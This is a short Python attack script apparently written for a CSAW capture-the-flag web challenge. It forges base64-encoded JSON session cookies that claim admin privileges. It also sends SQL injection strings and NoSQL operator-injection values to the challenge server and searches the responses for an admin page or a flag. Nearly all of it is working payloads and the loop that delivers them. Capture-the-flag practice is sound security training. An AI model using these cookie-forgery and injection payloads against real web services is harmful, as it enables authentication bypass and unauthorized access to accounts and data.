import requests
import base64
import json

def create_session(data):
    return base64.b64encode(json.dumps(data).encode()).decode()

def test_cookies(url):
    # Test various cookie combinations
    payloads = [
        {"email": "admin@mta.gov", "trackingID": "1", "privilege": 1},
        {"email": "admin", "trackingID": "1", "is_admin": True},
        {"email": "admin@mta.gov", "trackingID": "1", "role": "admin"},
        {"email": "admin", "trackingID": "'OR'1'='1", "privilege": 1},
        {"email": "admin", "trackingID": None, "admin": True},
        {"email": "admin@mta.gov", "trackingID": "1' OR '1'='1"},
        {"email": {"$ne": None}, "trackingID": "1", "privilege": {"$gt": 0}},
        {"email": "admin@mta.gov", "trackingID": "1", "admin": 1}
    ]

    for data in payloads:
        print(f"\nTrying payload: {data}")
        session = create_session(data)

        cookies = {
            'session': session,
            'trackingID': str(data.get('trackingID', '1'))
        }

        r = requests.get(url, cookies=cookies)
        print(f"Status: {r.status_code}, Length: {len(r.text)}")
        if "admin" in r.text.lower():
            print("Found admin reference in response!")
        if "csawctf{" in r.text:
            print("Found flag in response!")

url = "http://web.chal.csaw.io:5800"
test_cookies(url)

